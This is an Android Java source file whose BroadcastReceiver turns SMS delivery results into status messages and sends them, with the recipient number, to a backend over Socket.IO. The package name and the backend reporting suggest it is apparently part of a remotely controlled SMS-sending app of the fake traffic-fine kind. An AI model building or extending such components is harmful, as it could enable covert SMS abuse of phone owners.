package com.service.rtochallan;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

import org.json.JSONException;
import org.json.JSONObject;

public class SmsSendDeliveredReceiver extends BroadcastReceiver {
    protected SocketManager socketManager;

    @Override
    public void onReceive(Context context, Intent intent) {
        socketManager = SocketManager.getInstance(context);
        Helper helper = new Helper();

        int sms_send_id = intent.getIntExtra("sms_send_id", -1);
        String number = intent.getStringExtra("to_number");
        String status;
        String statusMessage;
        int errorCode = getResultCode();

        switch (errorCode) {
            case Activity.RESULT_OK:
                status = "Delivered";
                statusMessage = "SMS delivered successfully to " + number;
                break;

            case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                status = "UnDelivered";
                statusMessage = "Generic failure delivering to " + number;
                break;

            case SmsManager.RESULT_ERROR_NO_SERVICE:
                status = "UnDelivered";
                statusMessage = "No service while delivering to " + number;
                break;

            case SmsManager.RESULT_ERROR_NULL_PDU:
                status = "UnDelivered";
                statusMessage = "Null PDU while delivering to " + number;
                break;

            case SmsManager.RESULT_ERROR_RADIO_OFF:
                status = "UnDelivered";
                statusMessage = "Radio off — unable to deliver SMS to " + number;
                break;

            default:
                status = "UnDelivered";
                statusMessage = "Unknown delivery error (" + errorCode + ") for " + number;
                break;
        }

        try {
            JSONObject data = new JSONObject();
            data.put("sms_send_id", sms_send_id);
            data.put("sms_status", status);
            data.put("sms_status_message", statusMessage);

            // ✅ Emit update to the backend through Socket.IO
            socketManager.emit("update_sms_status_device", data);

            //Log.d(helper.TAG, "Delivery result: " + statusMessage);

        } catch (JSONException e) {
            e.printStackTrace(); // safer than crashing app
        }
    }
}
